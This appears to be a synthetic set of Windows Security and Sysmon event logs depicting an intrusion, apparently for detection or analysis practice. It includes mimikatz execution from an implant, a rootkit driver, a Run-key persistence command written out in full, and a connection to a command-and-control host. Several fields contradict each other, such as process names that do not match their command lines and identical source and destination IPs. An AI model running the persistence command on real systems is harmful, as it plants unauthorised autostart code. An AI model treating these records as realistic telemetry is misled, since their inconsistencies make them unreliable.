  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:32:49.0000000Z" /><EventRecordID>1261</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-4253-6722-7866-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">32186</Data><Data Name="ProcessName">C:\Windows\System32\reg.exe</Data><Data Name="WorkstationName">DC02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>8</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:33:01.0000000Z" /><EventRecordID>1262</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:33:01.0000000Z</Data><Data Name="SourceProcessId">60808</Data><Data Name="SourceImage">C:\Users\alice\AppData\Roaming\implant.exe</Data><Data Name="TargetProcessId">46409</Data><Data Name="TargetImage">C:\Tools\mimikatz.exe</Data><Data Name="NewThreadId">9444</Data><Data Name="StartAddress">0x7ff698dd6c3c</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:33:23.0000000Z" /><EventRecordID>1263</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-6185-1232-3465-1001</Data><Data Name="TargetUserName">t.miller</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">62222</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:33:32.0000000Z" /><EventRecordID>1264</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">bob</Data><Data Name="Workstation">DC01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4768</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:33:34.0000000Z" /><EventRecordID>1265</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="TargetUserName">john.doe</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="ServiceName">krbtgt</Data><Data Name="IpAddress">::10.0.1.12</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:36:57.0000000Z" /><EventRecordID>1266</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TaskName">\Microsoft\Windows\Defrag\ScheduledDefrag</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:37:24.0000000Z" /><EventRecordID>1267</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x1425</Data><Data Name="NewProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="CommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="ParentProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x5d4</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:37:38.0000000Z" /><EventRecordID>1268</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">john.doe</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x6a2a</Data><Data Name="NewProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="CommandLine">svchost.exe -k netsvcs</Data><Data Name="ParentProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xe40</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:37:46.0000000Z" /><EventRecordID>1269</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="ObjectName">C:\Windows\System32\drivers\rootkit.sys</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:38:29.0000000Z" /><EventRecordID>1270</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="TargetUserName">newuser666</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="PrivilegeList">-</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:38:32.0000000Z" /><EventRecordID>1271</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x26f2</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d C:\temp\update.exe</Data><Data Name="ParentProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xb64</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:38:56.0000000Z" /><EventRecordID>1272</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-9924-2633-8276-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">172.16.5.10</Data><Data Name="IpPort">39115</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:39:10.0000000Z" /><EventRecordID>1273</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:39:10.0000000Z</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="User">CONTOSO\john.doe</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.100.10.50</Data><Data Name="SourcePort">8527</Data><Data Name="DestinationIp">10.100.10.50</Data><Data Name="DestinationPort">443</Data><Data Name="DestinationHostname">au.download.windowsupdate.com</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:39:25.0000000Z" /><EventRecordID>1274</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">admin</Data><Data Name="Workstation">SRV-WEB01</Data><Data Name="Status">0xC0000064</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:39:54.0000000Z" /><EventRecordID>1275</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-5333-6036-7794-1001</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">16854</Data><Data Name="ProcessName">C:\Windows\System32\cmd.exe</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4698</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:41:22.0000000Z" /><EventRecordID>1276</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">alice</Data><Data Name="SubjectDomainName">.</Data><Data Name="TaskName">\Microsoft\Windows\UpdateOrchestrator\Schedule Scan</Data><Data Name="TaskContent">&lt;Task&gt;&lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;powershell.exe&lt;/Command&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>22</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:41:42.0000000Z" /><EventRecordID>1277</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:41:42.0000000Z</Data><Data Name="ProcessId">21805</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="QueryName">www.microsoft.com</Data><Data Name="QueryStatus">0</Data><Data Name="QueryResults">198.51.100.23</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:41:46.0000000Z" /><EventRecordID>1278</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.100.10.50</Data><Data Name="IpPort">41411</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>3</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:42:38.0000000Z" /><EventRecordID>1279</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T14:42:38.0000000Z</Data><Data Name="Image">C:\Windows\System32\regsvr32.exe</Data><Data Name="User">NT AUTHORITY\charlie</Data><Data Name="Protocol">tcp</Data><Data Name="SourceIp">10.100.10.50</Data><Data Name="SourcePort">65075</Data><Data Name="DestinationIp">10.0.0.5</Data><Data Name="DestinationPort">1337</Data><Data Name="DestinationHostname">c2.badactor.xyz</Data><Data Name="Initiated">true</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:42:55.0000000Z" /><EventRecordID>1280</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="ServiceName">RemoteRegistry</Data><Data Name="ServiceFileName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="ServiceType">0x10</Data><Data Name="ServiceStartType">2</Data><Data Name="ServiceAccount">LocalSystem</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:43:09.0000000Z" /><EventRecordID>1281</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">t.miller</Data><Data Name="Workstation">JUMPHOST01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:43:10.0000000Z" /><EventRecordID>1282</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">29690</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T14:43:29.0000000Z" /><EventRecordID>1283</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-7265-1414-3138-1001</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.1.12</Data><Data Name="IpPort">42604</Data><Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="WorkstationName">LAPTOP-MGMT</Data></EventData></Event>
  